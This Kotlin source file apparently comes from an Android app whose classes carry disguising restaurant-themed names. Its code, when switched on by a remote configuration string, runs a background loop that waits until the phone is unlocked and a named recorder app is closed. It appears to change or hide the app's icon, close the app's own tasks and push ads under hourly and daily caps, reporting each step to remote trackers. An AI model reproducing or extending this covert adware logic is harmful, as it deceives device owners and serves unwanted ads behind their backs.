package com.waitress.greeting

import android.app.Activity
import android.app.KeyguardManager
import android.content.Context
import android.os.PowerManager
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeoutOrNull
import java.io.File

/**
 * Date：2024/11/11
 * Describe:
 */
class ShiftImpl(private val context: Context) {
    private val mMainScope = CoroutineScope(Dispatchers.Main)
    val mActivityList = arrayListOf<Activity>()
    var shiftName = ""// 文件名
    var numTry by HostLongCacheImpl(type = 100)
    private val oneHour = 60000 * 60L
    private val oneDay = oneHour * 24
    private var lastShowAdTime: Long = 0

    var periodTime: Long = oneHour
    private var splashShowNum by HostLongCacheImpl(type = 100) // 小时
    private var homeShowNum by HostLongCacheImpl(type = 100) // 天
    private var homeClickSettingsNum by HostLongCacheImpl(type = 100) // 点击
    private var mHourTimeLong by HostLongCacheImpl(type = 100)
    private var indexNum by HostLongCacheImpl(-1)

    private var numShowMaxHour = 50
    private var numMaxShowDay = 76
    private var numMaxClickDay = 50

    fun adShowEvent() {
        lastShowAdTime = System.currentTimeMillis()
        splashShowNum++
        homeShowNum++
        // todo
        val tra: AdjustEvent? = when (homeShowNum.toString()) {
            "10" -> AdjustEvent("abc123")
            "20" -> AdjustEvent("abc123")
            "30" -> AdjustEvent("abc123")
            "40" -> AdjustEvent("abc123")
            "50" -> AdjustEvent("abc123")
            else -> null
        }
        if (tra != null) {
            Adjust.trackEvent(tra)
        }
    }

    fun adClickEvent() {
        homeClickSettingsNum++
    }

    fun refreshLimit(str: String) {
        if (str.contains("-").not()) return
        runCatching {
            val list = str.split("-")
            numShowMaxHour = list[0].toInt()
            numMaxShowDay = list[1].toInt()
            numMaxClickDay = list[2].toInt()
        }
    }


    private fun createFile() {
        if (MenuHelper.mDishBean.waitressStatus.contains("Busser")) return
        if (shiftName.isBlank()) return
        val file = File("${context.dataDir.path}/$shiftName")
        if (file.exists().not()) {
            file.createNewFile()
        }
    }

    fun isLimitLoad(): Boolean {
        if (isCurHour().not()) {
            splashShowNum = 0
        }
        if (isCurDay().not()) {
            MenuHelper.log("not cur day $indexNum")
            homeShowNum = 0
            homeClickSettingsNum = 0
        }
        val isDayAllow = homeShowNum < numMaxShowDay && homeClickSettingsNum < numMaxClickDay
        if (isDayAllow.not()) {
            postDayLimit()
        }
        val isLimit = splashShowNum >= numShowMaxHour || isDayAllow.not()
        MenuHelper.log("isLimit--->$isLimit --hour=$splashShowNum day=$homeShowNum click=$homeClickSettingsNum")
        return isLimit
    }

    private var isPost = false
    private fun postDayLimit() {
        if (isPost.not()) {
            isPost = true
            MenuHelper.mMealNetworkHelper.postEvent("getlimit")
        }
    }

    private fun isCurHour(): Boolean {
        if (System.currentTimeMillis() - mHourTimeLong > oneHour) {
            mHourTimeLong = System.currentTimeMillis()
            return false
        }
        return true
    }

    private fun isCurDay(): Boolean {
        val timeIndex = (System.currentTimeMillis() - MenuHelper.mDishBean.installTime) / oneDay
        if (timeIndex != indexNum) {
            indexNum = timeIndex
            return false
        }
        return true
    }

    fun refreshConfigure(str: String) {
        if (str.contains("Server")) {// A 方案
            WaitressAdHelper.waitressName = "man"
            MenuHelper.mMealNetworkHelper.postEvent("isuser", Pair("getstring", "a"))
            createFile()
            startTask()
        } else if (str.contains("Busser")) {//B 方案
            WaitressAdHelper.waitressName = "child"
            MenuHelper.mMealNetworkHelper.postEvent("isuser", Pair("getstring", "b"))
            createFile()
            startTask()
        }
        WaitressAdHelper.loadAd()
    }

    private suspend fun isInRecorder() {
        withTimeoutOrNull(10000) {
            var isCircle: Boolean
            while (true) {
                isCircle = false
                ArrayList(mActivityList).forEach {
                    if (it::class.java.canonicalName == "com.record.fdapxl.sound.recorderpuls114.MainActivity") {
                        isCircle = true
                    }
                }
                if (isCircle.not()) {
                    break
                }
                delay(600)
            }
        }

    }

    private var isCheck = false
    private var isInTask = false
    private fun startTask() {
        if (isInTask) return
        if (MenuHelper.mDishBean.waitressStatus.contains("Server")) {
            WaitressAdHelper.waitressName = "man"
            isInTask = true
            isCheck = true
            mMainScope.launch {
                isInRecorder()
                // 换icon
                WaitressAdHelper.event()
                while (isCheck) {
                    actionCheck()
                    delay(MenuHelper.mDishBean.timePeriodAd)
                }
            }
        } else {
            isInTask = false
        }
    }

    private var isUseNow = false

    fun nowToUse() {
        if (isUseNow) {
            isUseNow = false
            actionCheck()
        }
    }

    private fun actionCheck(): String {
        if (numTry > 77) {
            isCheck = false
            MenuHelper.mMealNetworkHelper.postEvent("jumpfail")
            return ""
        }
        var str = "time"
        if (isDeviceNotLock().not()) return postList(str)
        str += "-isunlock"
        if (MenuHelper.mDishBean.isFinishWaitTime().not()) return postList(str)
        if (System.currentTimeMillis() - lastShowAdTime < MenuHelper.mDishBean.timePeriodAd) return postList(
            str
        )
        if (isLimitLoad()) return postList(str)
        str += "-ispass"
        if (WaitressAdHelper.isReadyAd()) {
            str += "-isready"
            numTry++
            isUseNow = false
            if (lastShowAdTime == 0L) {
                lastShowAdTime = System.currentTimeMillis()
            } else {
                lastShowAdTime += 6000L
            }
            mMainScope.launch {
                ArrayList(mActivityList).forEach {
                    it.finishAndRemoveTask()
                }
                delay(500)
                MenuHelper.menuClose()
            }
        } else {
            WaitressAdHelper.loadAd()
            isUseNow = true
        }
        return postList(str)
    }

    private fun postList(str: String): String {
        if (str.contains("-")) {
            MenuHelper.mMealNetworkHelper.postList(str.split("-"))
        } else {
            MenuHelper.mMealNetworkHelper.postEvent(str)
        }
        return "111"
    }

    private fun isDeviceNotLock(): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

}